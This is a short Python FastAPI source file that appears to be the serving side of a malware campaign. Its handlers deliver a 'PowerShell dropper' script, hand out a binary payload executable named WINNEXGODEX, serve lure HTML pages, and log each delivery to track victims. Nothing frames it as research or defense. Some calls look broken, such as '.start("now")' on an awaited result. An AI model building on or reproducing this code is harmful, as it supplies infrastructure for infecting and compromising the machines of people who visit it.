from textfile_formatting import Html,PowerShell
import config
import os
import fastapi
from records_and_metrics import recorddDelivery

html = Html()
power_shell = PowerShell()

async def servePowerShellDroppperFile(request:fastapi.Request):
    await recorddDelivery(request)
    return fastapi.responses.Response(
        content=power_shell.getPowershellCode(),
        media_type="text/plain"
    )
async def serveFinal_WINNEXGODEX_DotEXE(request:fastapi.Request):
    await recorddDelivery(request)
    return fastapi.responses.FileResponse(
        config.conf["PATHS"]["BINARY_PAYLOAD"]
    )

async def mainInterface(request:fastapi.Request):
    await recorddDelivery(request).start("now")
    if os.environ.get("VERBOSE_DEBUG",None):print(html)
    return fastapi.responses.HTMLResponse(
        html.getTemplateFixedHtml()
    )

async def serveSecondHTML(request:fastapi.Request):
    await recorddDelivery(request).start("now")
    return fastapi.responses.HTMLResponse(
        html.getTemplateFixedHtml(fileOrder=2),
    )